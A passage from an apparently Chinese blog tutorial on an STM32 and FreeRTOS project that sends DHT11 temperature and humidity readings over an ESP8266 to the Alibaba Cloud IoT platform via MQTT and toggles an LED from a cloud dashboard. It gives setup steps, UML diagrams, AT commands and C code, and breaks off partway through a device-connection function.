<li><a href="#2115225612" title="STM32 移植 FreeRTOS - 基于 HAL 库" class="record-link ">STM32 移植 FreeRTOS - 基于 HAL 库</a></li>
</ul>
</li>
</ol>
<p>本文主要分为三个部分，每个部分需要准备的工具如下：</p>
<ol>
<li>阿里云物联网平台注册：需要阿里云账号。</li>
<li>模拟 MQTT 客户端发送与订阅消息：软件 MQTT.fx，阿里云提供的 MQTT_Password 工具。</li>
<li>ESP8266 固件烧录：串口助手软件，需要材料 ESP8266、USB-TTL、杜邦线若干。</li>
<li>软件实现：Keil 软件、STM32CubeMX（使用 HAL）、STM32、DHT11、杜邦线若干、OLED（可选）、LED 灯、ST-Link</li>
</ol>
<blockquote>
<p>[!hint] 阅读前的提示</p>
<ol>
<li>阿里云相关产品新用户只能免费试用 1 个月。比如物联网企业版实例新用户可以试用 1 个月，但也有公共实例<strong>永久免费使用</strong>。增值服务 IoT Studio 用于绘制可视化界面，可以试用 1 个月，但其实这也<strong>不是必须的</strong>，就是提供了一个可视化界面而已。</li>
<li>MQTT 功能是通过固件烧录进ESP8266中的，不是 MQTT 协议在 FreeRTOS 上的移植。</li>
<li>如果只是单纯实现温湿度监控及点灯的话，FreeRTOS 其实不是必须的。</li>
</ol>
</blockquote>
<h1>接线图与实物图展示</h1>
<blockquote>
<p>Visio 随便画的，感觉掌握不到诀窍，很难画。</p>
</blockquote>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240630000720.webp" alt="image.png"></p>
<blockquote>
<p>下图有个多余连接的串口，读者可以忽略。</p>
</blockquote>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240630135721.webp" alt="image.png|500"></p>
<h1>UML</h1>
<blockquote>
<p>如果 UML 图不规范请指出哈。我感觉 UML 图我永远画不对......</p>
</blockquote>
<p>用例图：</p>
<pre><code class="language-plantuml">@startuml
left to right direction
actor 用户 as user

rectangle 阿里云物联网平台 {
    (监测温湿度数据) as get
    (控制LED灯) as LED 
}

rectangle STM32 {
    (读取监测数据) as data 
    (获取温湿度数据) as getTH
    (发送温湿度数据至物联网平台) as send
    (接收LED控制信号) as getLED
    (设置LED灯) as setLED
}

user -- get
user -- data
user -- LED
get ..&gt; send: &lt;&lt;include&gt;&gt;
LED ..&gt; setLED: &lt;&lt;include&gt;&gt;
LED ..&gt; getLED: &lt;&lt;include&gt;&gt;
send -- getTH
data -- getTH

@enduml
</code></pre>
<p>用户通过阿里云物联网平台进行温湿度数据监测以及 LED 灯控制，此外，用户还可通过直接观察设备显示屏读取温湿度监测数据。对于通过阿里云物联网平台监测温湿度数据的用例，除了在远程平台实现可视化界面外，STM32 需实现将温湿度数据发送至远程平台的能力。无论是温湿度数据的本地展示或远程发送，都依赖于 STM32 中获取温湿度数据用例。该用例需要 STM32 与温湿度监测设备进行数据交互。远程平台中控制 LED 灯用例的实现不仅依赖于物联网平台提供的指令发送接口，也需要 STM32 实现信号的接收与 LED 灯设置的功能。</p>
<p>发送温湿度过程顺序图：</p>
<pre><code class="language-plantuml">@startuml

actor 用户 as user
participant 单片机 as STM32
participant 温湿度传感器 as DHT11
participant 显示设备 as OLED
participant WIFI模块 as ESP8266
database &quot;MQTT Broker&quot;  as Ali

STM32 -&gt; DHT11: 请求查询温湿度数据
activate STM32
activate DHT11

DHT11 --&gt; STM32: 温湿度数据
deactivate DHT11
STM32 -&gt; OLED: 发送温湿度数据
activate OLED

OLED-&gt; user: 展示温湿度数据
activate user
deactivate OLED
deactivate user

STM32 -&gt; ESP8266: 发送温湿度数据
activate ESP8266
ESP8266 -&gt; Ali: 发送温湿度数据
deactivate ESP8266
activate Ali
deactivate STM32

Ali -&gt; user: 在远程面板展示温湿度数据
deactivate Ali
activate user
deactivate user

@enduml
</code></pre>
<p>单片机从监测设备获取温湿度数据并发送至阿里云物联网平台过程的顺序图如上图所示。单片机初始化完毕后，利用 FreeRTOS 任务函数定时向 DHT11 发送复位信号。DHT11 接收复位信号后将 40 Bit 的检测数据通过单总线协议传输至 STM32 处理。随后，STM32 利用该数据完成以下任务：</p>
<ol>
<li>更新 OLED 显示屏，实现设备实时显示温湿度信息的功能。</li>
<li>将温湿度数据生成 AT 命令，通过串口发送至 ESP8266 模块中。</li>
</ol>
<p>ESP8266 模块接收到 AT 指令后，将通过 MQTT 协议向阿里云物联网平台发布消息。阿里云物联网平台将根据该消息的主题与参数，更新可视化界面的网络应用，从而实现用户远程监控设备的功能。</p>
<p>接收 LED 灯指令顺序图：</p>
<pre><code class="language-plantuml">@startuml

actor 用户 as user
database &quot;MQTT Broker&quot;  as Ali
participant WIFI模块 as ESP8266
participant 单片机 as STM32
participant LED as LED

user -&gt; Ali: 控制LED灯开关
activate Ali

Ali -&gt; ESP8266: LED灯控制信号
activate ESP8266
deactivate Ali


ESP8266 -&gt; STM32: 触发串口中断
deactivate ESP8266
activate STM32

STM32 -&gt; ESP8266: 处理串口中断
activate ESP8266

ESP8266 --&gt; STM32: LED控制信息
deactivate ESP8266

' STM32 -&gt; STM32
' activate STM32
' deactivate STM32

STM32 -&gt; LED: 点亮LED灯
activate LED


LED -&gt; user: 点亮LED灯
deactivate LED
deactivate STM32

activate user
deactivate user

@enduml
</code></pre>
<p>用户通过网络应用的可视化界面控制设备 LED 灯的顺序图如上图所示。用户通过可视化界面操作 LED 灯状态为“0（关闭）”或“1（开启）”。MQTT Broker 向设备发送消息，该消息由连接至 STM32 单片机的 WIFI 模块接收。WIFI 模块将接收到的数据存放在串口缓冲区中，并设置标志位提醒 STM32 单片机进行接收。STM32 利用 FreeRTOS 任务调度，获取 WIFI 模块返回的信息并解析 LED 灯控制指令。最后根据指令控制 LED 灯电路，改变灯的状态。</p>
<h1>阿里云物联网平台</h1>
<blockquote>
<p>此部分可参考官方文档：<a href="https://help.aliyun.com/zh/iot/getting-started/overview-7?spm=a2c4g.11186623.0.0.79fd1b1bZflRsN">如何快速将设备接入物联网平台并控制其开关_物联网平台(IoT)-阿里云帮助中心 (aliyun.com)</a></p>
</blockquote>
<h2>添加产品物模型</h2>
<p>首先你得拥有一个阿里云账号，然后开通物联网平台：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240405135040.webp" alt="image.png|500"></p>
<p>进入管理控制台：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240405135115.webp" alt="image.png|500"></p>
<p>创建一个实例（前提需实名认证）：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240405135235.webp" alt="image.png"></p>
<p>标准实例可以免费开通试用 1 个月。</p>
<blockquote>
<p>公共实例开通免费，但据说可能联网不佳，我试了一下感觉还行，没条件的可以直接使用公共实例。</p>
</blockquote>
<p>进入实例详情：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240405135609.webp" alt="image.png|500"></p>
<p>创建一个产品：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240405135735.webp" alt="image.png|500"></p>
<p>创建设备：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240405135903.webp" alt="image.png"></p>
<p>下面添加一个物模型：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240405135956.webp" alt="image.png"></p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240405140057.webp" alt="image.png|500"></p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240405140129.webp" alt="image.png"></p>
<h2>使用 IoT Studio 绘制界面</h2>
<p>回到物联网平台，查看增值服务。如果没有 IoT Studio，可以在选购增值服务中购买。IoT Studio 可以试用 1 个月。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240405140450.webp" alt="image.png|500"></p>
<p>进入 IoT Studio，选择你的实例，新建 Web 应用：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240405140617.webp" alt="image.png|500"></p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240405140657.webp" alt="image.png|500"></p>
<p>绘制一个像样的页面：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240405140802.webp" alt="image.png|500"></p>
<p>仪表盘数据源配置：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240405140841.webp" alt="image.png|500"></p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240405140944.webp" alt="image.png|500"></p>
<p>折线图数据源配置：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240405141607.webp" alt="image.png|375"></p>
<p>按钮交互配置：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240405141654.webp" alt="image.png|236"></p>
<p>这时点击预览的话仪表盘会显示没有数据，可继续下一章节阅读。</p>
<h1>MQTT.fx 模拟客户端发布与订阅消息</h1>
<blockquote>
<p>此部分可参考文档：<a href="https://help.aliyun.com/zh/iot/getting-started/using-mqtt-fx-to-access-iot-platform">使用MQTT协议模拟设备快速接入物联网平台_物联网平台(IoT)-阿里云帮助中心 (aliyun.com)</a></p>
</blockquote>
<p>安装 MQTT_Password 工具包：<a href="https://help.aliyun.com/zh/iot/user-guide/how-do-i-obtain-mqtt-parameters-for-authentication#section-jx3-u57-pmm">如何计算MQTT签名参数_物联网平台(IoT)-阿里云帮助中心 (aliyun.com)</a></p>
<p>安装 MQTT.fx：<a href="https://www.softblade.de/download/">MQTT.fx® Download (softblade.de)</a></p>
<p>回到阿里云物联网平台控制台&gt;设备&gt;查看，把三元素复制下来：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240405142608.webp" alt="image.png"></p>
<p>使用 MQTT_Password 计算签名：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240405142728.webp" alt="image.png"></p>
<blockquote>
<p>除了此处的 Clientid 是需要填入的设备信息 Clientid，其他所有地方说的 Client ID 都是指 MQTT 连接的 Client ID 具体值就是计算结果的 mqttClientid</p>
</blockquote>
<p>打开 MQTT.fx，配置：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240405142832.webp" alt="image.png"></p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240405143044.webp" alt="image.png"></p>
<p>Broker Address 为你的 <code>ProductID</code>+<code>.iot-as-mqtt.cn-shanghai.aliyuncs.com</code>。</p>
<p>链接。然后尝试发布消息和订阅消息：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240405143246.webp" alt="image.png"></p>
<p>连接后阿里云物联网平台将显示在线：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240405144051.webp" alt="image.png"></p>
<p>尝试在 <code>/sys/k10qu3ushCq/mqtt_stm32/thing/event/property/post</code> 发布一个 json 数据：</p>
<pre><code class="language-json">{&quot;params&quot;:{&quot;temperature&quot;:42,&quot;Humidity&quot;:22},&quot;version&quot;:&quot;1.0.0&quot;}
</code></pre>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240405143449.webp" alt="image.png"></p>
<p>结果在 IoT Studio 网页应用就会显示数据：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240405143533.webp" alt="image.png"></p>
<p>在 <code>/sys/k10qu3ushCq/mqtt_stm32/thing/service/property/set</code> 中订阅，点击开关按钮将收到消息：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240405143718.webp" alt="image.png"></p>
<h1>ESP8266 固件烧录及串口调试</h1>
<p>首先，固件烧录部分详看：<a href="#2777136240" title="ESP8266 烧写 AT MQTT 固件" class="record-link ">ESP8266 烧写 AT MQTT 固件</a>。</p>
<p>ESP8266 连上串口后测试 AT 命令（记得加 <code>\r\n</code>）：</p>
<pre><code class="language-sh"># 设置热点模式
AT+CWMODE=1

# 链接手机热点（或 WIFI）
AT+CWJAP=&quot;&lt;热点名称&gt;&quot;,&quot;&lt;热点密码&gt;&quot;

# MQTT配置。注意，逗号前加反斜杠。ClientID+用户名+密码
AT+MQTTUSERCFG=0,1,&quot;mqtt_stm32|securemode=2\,signmethod=hmacsha1\,timestamp=6606|&quot;,&quot;mqtt_stm32&amp;k1xxxxxxxq&quot;,&quot;5DExxxxxxC2&quot;,0,0,&quot;&quot;

# 连接 MQTT Broker
AT+MQTTCONN=0,&quot;k1xxxxxxxq.iot-as-mqtt.cn-shanghai.aliyuncs.com&quot;,1883,0

# 订阅 MQTT主题
AT+MQTTSUB=0,&quot;/sys/k10qu3ushCq/mqtt_stm32/thing/service/property/set&quot;,0

# 发送数据
AT+MQTTPUB=0,&quot;/sys/k10qu3ushCq/mqtt_stm32/thing/event/property/post&quot;,&quot;{\&quot;params\&quot;:{\&quot;temperature\&quot;:42\,\&quot;Humidity\&quot;:22}\,\&quot;version\&quot;:\&quot;1.0.0\&quot;}&quot;,0,0
</code></pre>
<blockquote>
<p>指令说明参考：<a href="https://docs.espressif.com/projects/esp-at/zh_CN/latest/esp32/Get_Started/index.html">入门指南 - ESP32 - — ESP-AT 用户指南 latest 文档 (espressif.com)</a></p>
</blockquote>
<p>测试发送时间上行成功后，可以继续测试 LED 开关命令。在 IoT Studio 点击按钮，串口助手将回显消息。</p>
<h1>软件实现思路</h1>
<p>整个 STM32 工程比较庞杂。本节介绍主要的具体思路，并展示重要代码过程。</p>
<p>主要思路：</p>
<ol>
<li>STM32 串口 1 用于向电脑发送数据，<code>printf</code> 重写为向串口 1 发送数据。详看：<a href="#1545394726" title="串口驱动程序之「发送数据」" class="record-link ">串口驱动程序之「发送数据」</a></li>
<li>串口 2 用于链接 ESP8266，需要实现不定长数据的收发。详看：<a href="#2867239616" title="串口驱动程序之「不定长字符串的接收」" class="record-link ">串口驱动程序之「不定长字符串的接收」</a></li>
<li>使用 DHT11 检测环境温湿度。详看：<a href="#3298282303" title="DHT11 驱动程序" class="record-link ">DHT11 驱动程序</a></li>
<li>OLED 模块作为温湿度数据的实时显示。详看：<a href="#2349657556" title="OLED 驱动程序" class="record-link ">OLED 驱动程序</a></li>
<li>一个任务指示灯，单纯用来指示 FreeRTOS 任务有没有卡死</li>
<li>一个 LED 灯用来应答阿里云发来的数据</li>
</ol>
<p>以下代码主要解析任务分配以及设备初始化的编写。标准库和 HAL 具体实现略有不同（LED 用的端口、不定长字符串接收的实现方式），请以具体配置为准。</p>
<h2>标准库</h2>
<p>main.c：</p>
<pre><code class="language-c">#include &quot;stm32f10x.h&quot;                  // Device header
#include &quot;gpio_out.h&quot;   
#include &quot;key.h&quot;
#include &quot;OLED.h&quot;
#include &quot;timer.h&quot;
#include &quot;SysTick.h&quot;
#include &quot;FreeRTOS.h&quot;
#include &quot;task.h&quot;
#include &lt;limits.h&gt;
#include &lt;string.h&gt;
#include &quot;dht11.h&quot;
#include &quot;esp8266.h&quot;
#include &quot;ALi_MQTT_Temp_Humi_LED_Device.h&quot;

//任务优先级
#define START_TASK_PRIO		1
//任务堆栈大小	
#define START_STK_SIZE 		128  
//任务句柄
TaskHandle_t StartTask_Handler;
//任务函数
void start_task(void *pvParameters);


//任务优先级
#define LED5_TASK_PRIO		2
//任务堆栈大小	
#define LED5_STK_SIZE 		50  
//任务句柄
TaskHandle_t LED5Task_Handler;
//任务函数
void led5_task(void *pvParameters);

//任务优先级
#define MAIN_TASK_PRIO		3
//任务堆栈大小	
#define MAIN_STK_SIZE 		50  
//任务句柄
TaskHandle_t MainTask_Handler;
//任务函数
void main_task(void *pvParameters);

//任务优先级
#define WIFI_INIT_TASK_PRIO		4
//任务堆栈大小	
#define WIFI_INIT_STK_SIZE 		128  
//任务句柄
TaskHandle_t WifiInitTask_Handler;
//任务函数
void wifi_init_task(void *pvParameters);

//任务优先级
#define WIFI_TASK_PRIO		5
//任务堆栈大小	
#define WIFI_STK_SIZE 		128  
//任务句柄
TaskHandle_t WifiTask_Handler;
//任务函数
void wifi_task(void *pvParameters);

//任务优先级
#define TEST_ON_TASK_PRIO		6
//任务堆栈大小	
#define TEST_ON_STK_SIZE 		128  
//任务句柄
TaskHandle_t TestOnTask_Handler;
//任务函数
void test_on_task(void *pvParameters);

//任务优先级
#define TEST_OFF_TASK_PRIO		6
//任务堆栈大小	
#define TEST_OFF_STK_SIZE 		128  
//任务句柄
TaskHandle_t TestOffTask_Handler;
//任务函数
void test_off_task(void *pvParameters);

// LED灯
#define LED5 GPIO_Pin_5

// ESP8266 RESET
//#define ESP8266_RESET GPIO_Pin_7 // 低电平 reset


/*******************************************************************************
* 函 数 名         : main
* 函数功能		   : 主函数
* 输    入         : 无
* 输    出         : 无
*******************************************************************************/
int main()
{
	SysTick_Init(72);
	NVIC_PriorityGroupConfig(NVIC_PriorityGroup_4);//设置系统中断优先级分组4
	GPIO_OUT_Init(LED5); // FreeRTOS任务指示灯
	
	AMTHL_Init();
	
	
	//创建开始任务
    xTaskCreate((TaskFunction_t )start_task,            //任务函数
                (const char*    )&quot;start_task&quot;,          //任务名称
                (uint16_t       )START_STK_SIZE,        //任务堆栈大小
                (void*          )NULL,                  //传递给任务函数的参数
                (UBaseType_t    )START_TASK_PRIO,       //任务优先级
                (TaskHandle_t*  )&amp;StartTask_Handler);   //任务句柄              
    vTaskStartScheduler();          //开启任务调度
}

//开始任务任务函数
void start_task(void *pvParameters)
{
    taskENTER_CRITICAL();           //进入临界区

	//创建任务指示灯任务
    xTaskCreate((TaskFunction_t )led5_task,     
                (const char*    )&quot;led5_task&quot;,   
                (uint16_t       )LED5_STK_SIZE, 
                (void*          )NULL,
                (UBaseType_t    )LED5_TASK_PRIO,
                (TaskHandle_t*  )&amp;LED5Task_Handler); 
	//创建main任务
    xTaskCreate((TaskFunction_t )main_task,     
                (const char*    )&quot;main_task&quot;,   
                (uint16_t       )MAIN_STK_SIZE, 
                (void*          )NULL,
                (UBaseType_t    )MAIN_TASK_PRIO,
                (TaskHandle_t*  )&amp;MainTask_Handler);
	//创建wifi任务
    xTaskCreate((TaskFunction_t )wifi_init_task,     
                (const char*    )&quot;wifi_init_task&quot;,   
                (uint16_t       )WIFI_INIT_STK_SIZE, 
                (void*          )NULL,
                (UBaseType_t    )WIFI_INIT_TASK_PRIO,
                (TaskHandle_t*  )&amp;WifiInitTask_Handler);
				
    vTaskDelete(StartTask_Handler); //删除开始任务
    taskEXIT_CRITICAL();            //退出临界区
} 



void led5_task(void *pvParameters)
{
    while(1)
    {
        GPIO_OUT_Set(LED5,1);
        vTaskDelay(200);

        GPIO_OUT_Set(LED5,0);
        vTaskDelay(800);

    }
}

extern unsigned int rec_data[4];
void main_task(void *pvParameters)
{
    while(1)
    {
		DHT11_REC_Data();
        OLED_ShowNum(2,7,rec_data[2],2);
		OLED_ShowNum(2,10,rec_data[3],2);
		OLED_ShowNum(3,7,rec_data[0],2);
		OLED_ShowNum(3,10,rec_data[1],2);
		Delay_ms(2000);// 延时2s 否则DHT11数据不稳定
    }
}

// 一次性任务
void wifi_init_task(void *pvParameters)
{
    
	AMTHL_Connet();
	xTaskCreate((TaskFunction_t )wifi_task,     
			(const char*    )&quot;wifi_task&quot;,   
			(uint16_t       )WIFI_STK_SIZE, 
			(void*          )NULL,
			(UBaseType_t    )WIFI_TASK_PRIO,
			(TaskHandle_t*  )&amp;WifiTask_Handler);
	xTaskCreate((TaskFunction_t )test_on_task,     
			(const char*    )&quot;test_on_task&quot;,   
			(uint16_t       )TEST_ON_STK_SIZE, 
			(void*          )NULL,
			(UBaseType_t    )TEST_ON_TASK_PRIO,
			(TaskHandle_t*  )&amp;TestOnTask_Handler);
	xTaskCreate((TaskFunction_t )test_off_task,     
			(const char*    )&quot;test_off_task&quot;,   
			(uint16_t       )TEST_OFF_STK_SIZE, 
			(void*          )NULL,
			(UBaseType_t    )TEST_OFF_TASK_PRIO,
			(TaskHandle_t*  )&amp;TestOffTask_Handler);

    vTaskDelete(WifiInitTask_Handler);
}

void wifi_task(void *pvParameters)
{
	vTaskDelay(2000);
	
    while(1)
	{
		AMTHL_SendMessage();
		vTaskDelay(10000);
	}
}

// 两个任务以防任务偏向
void test_on_task(void *pvParameters)
{
    while(1)
	{
		if(AMTHL_LED_ON()) // 消除抖动
			Delay_ms(1000);
		vTaskDelay(50);
	}
}

void test_off_task(void *pvParameters)
{
    while(1)
	{
		if(AMTHL_LED_OFF()) // 消除抖动
			Delay_ms(1000);
		vTaskDelay(50);
	}
}

</code></pre>
<p>设备：</p>
<pre><code class="language-c">#include &quot;stm32f10x.h&quot;                  // Device header
#include &quot;ALi_MQTT_Temp_Humi_LED_Device.h&quot;

#include &quot;serial.h&quot;
#include &quot;OLED.h&quot;
#include &quot;esp8266.h&quot;
#include &quot;SysTick.h&quot;
#include &quot;dht11.h&quot;
#include &quot;gpio_out.h&quot;

#define WIFI_SSID		&quot;ssid&quot;
#define WIFI_PASSWORD	&quot;ssidpswd&quot;
#define MQTT_CLIENT_ID	&quot;mqtt_stm32|securemode=2\\,signmethod=hmacsha1\\,timestamp=106|&quot;
#define MQTT_USER_NAME	&quot;mqtt_stm32&amp;kxxxxCq&quot;
#define MQTT_PASSWD		&quot;5DE3xxxxxxxxxEA4C2&quot;
#define BROKER_ASDDRESS	&quot;kxxxxxCq.iot-as-mqtt.cn-shanghai.aliyuncs.com&quot;
#define SUB_TOPIC		&quot;/sys/kxxxxxq/mqtt_stm32/thing/service/property/set&quot;
#define PUB_TOPIC 		&quot;/sys/kxxxxxq/mqtt_stm32/thing/event/property/post&quot;
#define JSON_FORMAT 	&quot;{\\\&quot;params\\\&quot;:{\\\&quot;temperature\\\&quot;:%u\\,\\\&quot;Humidity\\\&quot;:%u}\\,\\\&quot;version\\\&quot;:\\\&quot;1.0.0\\\&quot;}&quot;

#define SIGNAL_LED GPIO_Pin_6
#define MQTTPUB_BUF_SIZE 256
extern unsigned int rec_data[4]; // DHT11
extern USART_Buffer ESP8266_Buffer;
void AMTHL_Init(void){
	OLED_Init();
	Serial_Init(115200); // 波特率115200
	ESP8266_Init(115200);
	GPIO_OUT_Init(SIGNAL_LED);
	
	OLED_Clear();
	OLED_ShowString(1,1,&quot;DHT11 Data&quot;);
	OLED_ShowString(2,1,&quot;Temp:&quot;);
	OLED_ShowString(2,9,&quot;.&quot;);
	OLED_ShowString(3,1,&quot;Humi:&quot;);
	OLED_ShowString(3,9,&quot;.&quot;);
}

void AMTHL_Connet(void){
	printf(&quot;1. Set Station Mode.\r\n&quot;);
	ESP8266_Cmd(&quot;AT+CWMODE=1&quot;,&quot;OK&quot;,500);
	Delay_ms(1000);
	
	printf(&quot;2. Close ESP8266 Echo.\r\n&quot;);
	ESP8266_Cmd(&quot;ATE0&quot;,&quot;OK&quot;,500);
	Delay_ms(1000);
	
	printf(&quot;3. No Auto Connect WIFI.\r\n&quot;);
	ESP8266_Cmd(&quot;AT+CWAUTOCONN=0\r\n&quot;,&quot;OK&quot;,500);
	Delay_ms(1000);
	
	printf(&quot;4. Start Connecting.\r\n&quot;);
	ESP8266_Cmd(&quot;AT+CWJAP=\&quot;&quot;WIFI_SSID&quot;\&quot;,\&quot;&quot; WIFI_PASSWORD &quot;\&quot;&quot;,&quot;OK&quot;,200);
	Delay_ms(5000);
	ESP8266_Cmd(&quot;AT+MQTTUSERCFG=0,1,\&quot;&quot;  MQTT_CLIENT_ID &quot;\&quot;,\&quot;&quot; MQTT_USER_NAME &quot;\&quot;,\&quot;&quot;  MQTT_PASSWD   &quot;\&quot;,0,0,\&quot;\&quot;&quot;,&quot;OK&quot;,200);
	Delay_ms(3000);
	ESP8266_Cmd(&quot;AT+MQTTCONN=0,\&quot;&quot; BROKER_ASDDRESS  &quot;\&quot;,1883,0&quot;,&quot;OK&quot;,200);
	Delay_ms(3000);
	ESP8266_Cmd(&quot;AT+MQTTSUB=0,\&quot;&quot;  SUB_TOPIC &quot;\&quot;,0&quot;,&quot;OK&quot;,200);
	Delay_ms(3000);
}

void AMTHL_SendMessage(void){
	char buf[MQTTPUB_BUF_SIZE];
	unsigned int temp,humi;
	temp = rec_data[2];
	humi = rec_data[0];
	sprintf(buf,&quot;AT+MQTTPUB=0,\&quot;&quot; PUB_TOPIC &quot;\&quot;,\&quot;&quot; JSON_FORMAT  &quot;\&quot;,0,0&quot;,temp,humi);
	ESP8266_Cmd(buf,&quot;OK&quot;,200);
	
	printf(&quot;Temp: %u degree, Humi: %u %%&quot;,temp,humi);
}

uint8_t AMTHL_LED_ON(void){
	if (ESP8266_Buffer.FinishFlag){
		if(ESP8266_Check_Str(ESP8266_Buffer.Body,&quot;{\&quot;LED\&quot;:1}&quot;)){
			GPIO_OUT_Set(SIGNAL_LED,0); // 开灯
			return 1;
		}
	}
	return 0;
}

uint8_t AMTHL_LED_OFF(void){
	if (ESP8266_Buffer.FinishFlag){
		if(ESP8266_Check_Str(ESP8266_Buffer.Body,&quot;{\&quot;LED\&quot;:0}&quot;)){
			GPIO_OUT_Set(SIGNAL_LED,1); // 关灯
			return 1;
		}
	}
	return 0;
}

</code></pre>
<h2>HAL 库</h2>
<p>任务配置：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240405152014.webp" alt="image.png"></p>
<p>freertos.c：</p>
<pre><code class="language-c">/* Includes ------------------------------------------------------------------*/
#include &quot;FreeRTOS.h&quot;
#include &quot;task.h&quot;
#include &quot;main.h&quot;
#include &quot;cmsis_os.h&quot;

/* Private includes ----------------------------------------------------------*/
/* USER CODE BEGIN Includes */
#include &quot;OLED.h&quot;
#include &quot;dht11.h&quot;
#include &quot;usart.h&quot;
#include &quot;esp8266.h&quot;
#include &quot;ali_device.h&quot;
/* USER CODE END Includes */


/* Private variables ---------------------------------------------------------*/
/* USER CODE BEGIN Variables */
extern uint8_t temperature;         
extern uint8_t humidity; 
/* USER CODE END Variables */

// 省略自动生成内容


void led_task_func(void *argument)
{
  /* USER CODE BEGIN led_task_func */
  /* Infinite loop */
  for(;;)
  {
	  // 任务指示灯
	HAL_GPIO_TogglePin(GPIOC,GPIO_PIN_13);
	osDelay(200);
	HAL_GPIO_TogglePin(GPIOC,GPIO_PIN_13);
	osDelay(800);
  }
  /* USER CODE END led_task_func */
}


void detect_task_finc(void *argument)
{
  /* USER CODE BEGIN detect_task_finc */
	
  /* Infinite loop */
  for(;;)
  {	
	if(AMTHL_LED_ON())
		osDelay(500);
	if(AMTHL_LED_OFF())
		osDelay(500);
	osDelay(50);
  }
  /* USER CODE END detect_task_finc */
}


void ali_mqtt_task_func(void *argument)
{
  /* USER CODE BEGIN ali_mqtt_task_func */
  AMTHL_Connet();
  /* Infinite loop */
  for(;;)
  {
	// 顺带显示
	DHT11_Read_Data(&amp;humidity,&amp;temperature);
	OLED_ShowNum(2,7,temperature,2);
	OLED_ShowNum(3,7,humidity,2);
	AMTHL_SendMessage();
    osDelay(2000);
  }
  /* USER CODE END ali_mqtt_task_func */
}

</code></pre>
<p>设备：</p>
<pre><code class="language-c">
#include &quot;cmsis_os.h&quot;
#include &quot;usart.h&quot;
#include &quot;esp8266.h&quot;
#include &quot;dht11.h&quot;

#include &quot;OLED.h&quot;

#include &quot;ali_device.h&quot;

#define WIFI_SSID		&quot;ssid&quot;
#define WIFI_PASSWORD	&quot;ssidpswd&quot;
#define MQTT_CLIENT_ID	&quot;mqtt_stm32|securemode=2\\,signmethod=hmacsha1\\,timestamp=106|&quot;
#define MQTT_USER_NAME	&quot;mqtt_stm32&amp;kxxxxCq&quot;
#define MQTT_PASSWD		&quot;5DE3xxxxxxxxxEA4C2&quot;
#define BROKER_ASDDRESS	&quot;kxxxxxCq.iot-as-mqtt.cn-shanghai.aliyuncs.com&quot;
#define SUB_TOPIC		&quot;/sys/kxxxxxq/mqtt_stm32/thing/service/property/set&quot;
#define PUB_TOPIC 		&quot;/sys/kxxxxxq/mqtt_stm32/thing/event/property/post&quot;
#define JSON_FORMAT 	&quot;{\\\&quot;params\\\&quot;:{\\\&quot;temperature\\\&quot;:%u\\,\\\&quot;Humidity\\\&quot;:%u}\\,\\\&quot;version\\\&quot;:\\\&quot;1.0.0\\\&quot;}&quot;


#define MQTTPUB_BUF_SIZE 256
char buf[MQTTPUB_BUF_SIZE];

extern uint8_t temperature;         
extern uint8_t humidity; 

//#define MQTTPUB_BUF_SIZE 256

//extern unsigned int rec_data[4]; // DHT11
//extern USART_Buffer ESP8266_Buffer;
void AMTHL_Init(void){
	OLED_Clear();
	OLED_ShowString(1,1,&quot;DHT11&quot;);
	OLED_ShowString(2,1,&quot;temp:&quot;);
	OLED_ShowString(2,10,&quot;^C&quot;);
	OLED_ShowString(3,1,&quot;humi:&quot;);
	OLED_ShowString(3,10,&quot;%&quot;);

}

void AMTHL_Connet(void){
	printf(&quot;1. Set Station Mode.\r\n&quot;);
	ESP8266_Cmd((uint8_t*)&quot;AT+CWMODE=1&quot;,(uint8_t*)&quot;OK&quot;,100);
	osDelay(100);
	
	printf(&quot;2. Close ESP8266 Echo.\r\n&quot;);
	ESP8266_Cmd((uint8_t*)&quot;ATE0&quot;,(uint8_t*)&quot;OK&quot;,100);
	osDelay(100);
	
	printf(&quot;3. No Auto Connect WIFI.\r\n&quot;);
	ESP8266_Cmd((uint8_t*)&quot;AT+CWAUTOCONN=0\r\n&quot;,(uint8_t*)&quot;OK&quot;,500);
	osDelay(100);
	
	printf(&quot;*** Start Connecting. ***\r\n&quot;);
	ESP8266_Cmd((uint8_t*)&quot;AT+CWJAP=\&quot;&quot;WIFI_SSID&quot;\&quot;,\&quot;&quot; WIFI_PASSWORD &quot;\&quot;&quot;,(uint8_t*)&quot;OK&quot;,1000);
	osDelay(5000);
	ESP8266_Cmd((uint8_t*)&quot;AT+MQTTUSERCFG=0,1,\&quot;&quot;  MQTT_CLIENT_ID &quot;\&quot;,\&quot;&quot; MQTT_USER_NAME &quot;\&quot;,\&quot;&quot;  MQTT_PASSWD   &quot;\&quot;,0,0,\&quot;\&quot;&quot;,(uint8_t*)&quot;OK&quot;,200);
	osDelay(3000);
	ESP8266_Cmd((uint8_t*)&quot;AT+MQTTCONN=0,\&quot;&quot; BROKER_ASDDRESS  &quot;\&quot;,1883,0&quot;,(uint8_t*)&quot;OK&quot;,200);
	osDelay(3000);
